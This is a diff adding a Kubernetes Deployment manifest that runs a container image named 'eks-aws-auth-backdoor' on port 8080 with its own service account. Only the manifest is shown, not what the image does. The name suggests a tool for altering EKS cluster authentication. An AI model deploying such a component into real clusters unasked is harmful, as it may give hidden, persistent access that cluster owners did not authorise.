@@ -1,0 +1,23 @@
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: eks-aws-auth-backdoor
+  labels:
+    app: eks-aws-auth-backdoor
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: eks-aws-auth-backdoor
+  template:
+    metadata:
+      labels:
+        app: eks-aws-auth-backdoor
+    spec:
+      serviceAccountName: eks-aws-auth-backdoor
+      containers:
+        - name: eks-aws-auth-backdoor
+          image: nutellinoit/eks-aws-auth-backdoor
+          ports:
+            - containerPort: 8080
